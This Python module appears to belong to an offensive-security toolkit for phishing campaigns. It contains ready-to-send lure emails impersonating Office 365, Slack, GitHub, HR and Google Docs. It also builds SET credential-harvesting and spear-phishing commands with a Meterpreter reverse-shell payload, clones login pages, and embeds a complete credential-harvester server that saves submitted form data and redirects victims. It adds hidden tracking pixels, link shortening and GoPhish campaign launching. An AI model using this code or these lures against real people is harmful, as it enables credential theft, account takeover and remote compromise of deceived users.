"""Social Engineering Module — SET integration, phishing campaigns, credential harvesting."""

from __future__ import annotations
import json
import os
import subprocess
import time
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Optional


@dataclass
class PhishingTemplate:
    """Phishing email template."""
    name: str
    subject: str
    body: str
    category: str  # credential_harvest, malware_delivery, link_click, attachment
    difficulty: str  # easy, medium, hard
    description: str
    target_type: str  # corporate, personal, admin


@dataclass
class PhishingCampaign:
    """Phishing campaign configuration."""
    id: str
    name: str
    template: str
    targets: list[str]
    sender_email: str
    sender_name: str
    smtp_server: str
    smtp_port: int
    tracking_enabled: bool
    created_at: str
    status: str  # draft, active, completed


@dataclass
class CampaignResult:
    """Result of a phishing campaign."""
    campaign_id: str
    total_sent: int
    total_opened: int
    total_clicked: int
    total_credentials: int
    open_rate: float
    click_rate: float
    credential_rate: float
    timestamp: str


class SocialEngineering:
    """
    Social Engineering toolkit for phishing campaigns and credential harvesting.

    Integrates with Social Engineering Toolkit (SET) and custom scripts.
    """

    def __init__(self, config: Optional[dict] = None):
        self.config = config or {}
        self._templates = self._load_templates()
        self._campaigns: dict[str, PhishingCampaign] = {}

    def _load_templates(self) -> list[PhishingTemplate]:
        """Load built-in phishing templates."""
        return [
            PhishingTemplate(
                name="credential_harvest_generic",
                subject="Your account needs verification",
                body="Dear user,\n\nWe detected unusual activity on your account. Please verify your credentials immediately.\n\nClick here: {url}\n\nRegards,\nIT Security Team",
                category="credential_harvest",
                difficulty="easy",
                description="Generic credential harvesting page mimicking login",
                target_type="corporate",
            ),
            PhishingTemplate(
                name="office365_login",
                subject="Action Required: Sign-in from new device",
                body="We noticed a new sign-in to your account.\n\nDevice: Unknown\nLocation: {location}\n\nIf this wasn't you, secure your account: {url}",
                category="credential_harvest",
                difficulty="medium",
                description="Office 365 login page clone",
                target_type="corporate",
            ),
            PhishingTemplate(
                name="password_expiry",
                subject="Your password will expire in 3 days",
                body="Your network password will expire soon. Please update it now to avoid account lockout.\n\nUpdate password: {url}\n\nIT Help Desk",
                category="credential_harvest",
                difficulty="easy",
                description="Password expiry notification with fake reset link",
                target_type="corporate",
            ),
            PhishingTemplate(
                name="invoice_attached",
                subject="Invoice #{invoice_num} - Payment Overdue",
                body="Please find attached invoice #{invoice_num} for your review.\n\nPayment is overdue by 30 days.\n\nBest regards,\nAccounts Department",
                category="attachment",
                difficulty="medium",
                description="Malicious invoice attachment",
                target_type="corporate",
            ),
            PhishingTemplate(
                name="slack_notification",
                subject="You have 3 new messages in #general",
                body="You have unread messages in Slack.\n\nView messages: {url}\n\nSent from Slack",
                category="credential_harvest",
                difficulty="medium",
                description="Slack notification clone",
                target_type="corporate",
            ),
            PhishingTemplate(
                name="github_security",
                subject="[GitHub] Security alert: secret found in repository",
                body="GitHub detected a potential secret in your repository.\n\nReview the alert: {url}\n\nThis is an automated message from GitHub Security.",
                category="link_click",
                difficulty="hard",
                description="GitHub security alert phishing",
                target_type="corporate",
            ),
            PhishingTemplate(
                name="hr_benefits",
                subject="Open Enrollment: Update your benefits by Friday",
                body="Dear employee,\n\nOpen enrollment ends this Friday. Please review and update your benefits selection.\n\nAccess portal: {url}\n\nHR Department",
                category="credential_harvest",
                difficulty="easy",
                description="HR benefits portal phishing",
                target_type="corporate",
            ),
            PhishingTemplate(
                name="shared_document",
                subject="shared a document with you",
                body="Someone shared a document with you.\n\nView document: {url}\n\nPowered by Google Docs",
                category="link_click",
                difficulty="easy",
                description="Fake Google Docs shared document",
                target_type="personal",
            ),
        ]

    # ==================== SET INTEGRATION ====================

    def set_create_project(self, project_name: str) -> dict[str, Any]:
        """Create a Social Engineering Toolkit project."""
        cmd = f"setoolkit -q -p {project_name}"
        return {
            "command": cmd,
            "description": f"Create SET project: {project_name}",
            "risk_level": "active",
            "docker_required": True,
        }

    def set_harvest_credentials(self, target_url: str, port: int = 80) -> dict[str, Any]:
        """Launch credential harvesting attack via SET."""
        cmd = (
            "setoolkit -q "
            "-p social-engineering "
            "-t web-attack "
            "-p credential-harvester "
            f"-p website-clone "
            f"--url {target_url} "
            f"--port {port}"
        )
        return {
            "command": cmd,
            "description": f"SET credential harvester on {target_url}:{port}",
            "risk_level": "dangerous",
            "docker_required": True,
            "port": port,
        }

    def set_spear_phish(
        self,
        target_email: str,
        payload_type: str = "windows/meterpreter/reverse_tcp",
        lhost: str = "0.0.0.0",
        lport: str = "4444",
    ) -> dict[str, Any]:
        """Launch spear phishing attack via SET."""
        cmd = (
            "setoolkit -q "
            "-p social-engineering "
            "-t spear-phishing "
            f"-p {payload_type} "
            f"--lhost {lhost} "
            f"--lport {lport} "
            f"--target {target_email}"
        )
        return {
            "command": cmd,
            "description": f"SET spear phishing: {target_email}",
            "risk_level": "critical",
            "docker_required": True,
            "confirmation_required": True,
        }

    # ==================== CUSTOM PHISHING ====================

    def generate_phishing_page(
        self,
        target_url: str,
        output_dir: str = "/tmp/phishing",
        template: str = "credential_harvest_generic",
    ) -> dict[str, Any]:
        """Generate a phishing page that clones the target login."""
        tmpl = next((t for t in self._templates if t.name == template), None)
        if not tmpl:
            tmpl = self._templates[0]

        cmd = (
            f"mkdir -p {output_dir} && "
            f"python3 -c \""
            f"import requests; "
            f"r = requests.get('{target_url}'); "
            f"open('{output_dir}/index.html', 'w').write(r.text); "
            f"print('Cloned: {target_url}')"
            f"\""
        )
        return {
            "command": cmd,
            "description": f"Clone {target_url} as phishing page",
            "output_dir": output_dir,
            "template": tmpl.name,
            "risk_level": "active",
            "docker_required": False,
        }

    def generate_credential_harvester(
        self,
        listen_port: int = 8080,
        redirect_url: str = "https://google.com",
    ) -> dict[str, Any]:
        """Generate a credential harvester server."""
        script = f"""#!/usr/bin/env python3
import http.server, urllib.parse, json, datetime, sys

class CredentialHarvester(http.server.BaseHTTPRequestHandler):
    captured = []

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode()
        params = urllib.parse.parse_qs(body)
        entry = {{'time': str(datetime.datetime.now()), 'data': params, 'path': self.path}}
        CredentialHarvester.captured.append(entry)
        with open('/tmp/credentials_captured.json', 'w') as f:
            json.dump(CredentialHarvester.captured, f, indent=2)
        print(f'[CAPTURED] {{params}}')
        self.send_response(302)
        self.send_header('Location', '{redirect_url}')
        self.end_headers()

    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', '{redirect_url}')
        self.end_headers()

    def log_message(self, format, *args):
        pass

print(f'[*] Credential harvester listening on port {listen_port}')
http.server.HTTPServer(('0.0.0.0', {listen_port}), CredentialHarvester).serve_forever()
"""
        script_path = "/tmp/harvester.py"
        return {
            "command": f"python3 {script_path}",
            "script_content": script,
            "script_path": script_path,
            "description": f"Credential harvester on port {listen_port}",
            "risk_level": "dangerous",
            "port": listen_port,
        }

    # ==================== CAMPAIGN MANAGEMENT ====================

    def create_campaign(
        self,
        name: str,
        targets: list[str],
        template_name: str = "credential_harvest_generic",
        sender_email: str = "security@company.com",
        smtp_server: str = "smtp.gmail.com",
        smtp_port: int = 587,
    ) -> PhishingCampaign:
        """Create a phishing campaign."""
        campaign_id = f"camp_{int(time.time())}"
        tmpl = next((t for t in self._templates if t.name == template_name), self._templates[0])

        campaign = PhishingCampaign(
            id=campaign_id,
            name=name,
            template=tmpl.name,
            targets=targets,
            sender_email=sender_email,
            sender_name="IT Security Team",
            smtp_server=smtp_server,
            smtp_port=smtp_port,
            tracking_enabled=True,
            created_at=datetime.now().isoformat(),
            status="draft",
        )
        self._campaigns[campaign_id] = campaign
        return campaign

    def get_campaign_report(self, campaign_id: str) -> dict[str, Any]:
        """Get campaign report with statistics."""
        campaign = self._campaigns.get(campaign_id)
        if not campaign:
            return {"error": "Campaign not found"}

        return {
            "campaign_id": campaign.id,
            "name": campaign.name,
            "status": campaign.status,
            "targets": len(campaign.targets),
            "created_at": campaign.created_at,
            "template": campaign.template,
        }

    def list_templates(self) -> list[dict[str, str]]:
        """List available phishing templates."""
        return [
            {
                "name": t.name,
                "description": t.description,
                "category": t.category,
                "difficulty": t.difficulty,
                "target_type": t.target_type,
            }
            for t in self._templates
        ]

    # ==================== GOPhish API ====================

    def gophish_create_campaign(
        self,
        name: str,
        url: str,
        template_name: str,
        targets: list[dict],
        smtp_profile: str,
    ) -> dict[str, Any]:
        """Create campaign via GoPhish API."""
        payload = {
            "name": name,
            "url": url,
            "template": {"name": template_name},
            "targets": targets,
            "smtp": {"name": smtp_profile},
            "launch_date": datetime.now().isoformat(),
        }
        return {
            "command": f"curl -X POST https://localhost:3333/api/campaigns -H 'Content-Type: application/json' -d '{json.dumps(payload)}'",
            "description": f"Create GoPhish campaign: {name}",
            "payload": payload,
            "risk_level": "dangerous",
            "confirmation_required": True,
        }

    # ==================== UTILITY ====================

    def generate_tracking_pixel(self, tracking_id: str, callback_url: str) -> str:
        """Generate an email tracking pixel."""
        return (
            f'<img src="{callback_url}/track?id={tracking_id}" '
            f'width="1" height="1" style="display:none" />'
        )

    def generate_short_url(self, target_url: str) -> dict[str, Any]:
        """Generate a URL shortener command for phishing links."""
        return {
            "command": f"curl -s 'https://is.gd/create.php?format=simple&url={target_url}'",
            "description": f"Shorten URL for phishing: {target_url}",
            "risk_level": "safe",
        }

    def email_spoof_check(self, domain: str) -> dict[str, Any]:
        """Check if domain allows email spoofing."""
        checks = {
            "spf": f"dig {domain} TXT +short | grep spf",
            "dkim": f"dig default._domainkey.{domain} TXT +short",
            "dmarc": f"dig _dmarc.{domain} TXT +short",
        }
        return {
            "commands": checks,
            "description": f"Check email spoofing protections for {domain}",
            "risk_level": "safe",
            "docker_required": False,
        }
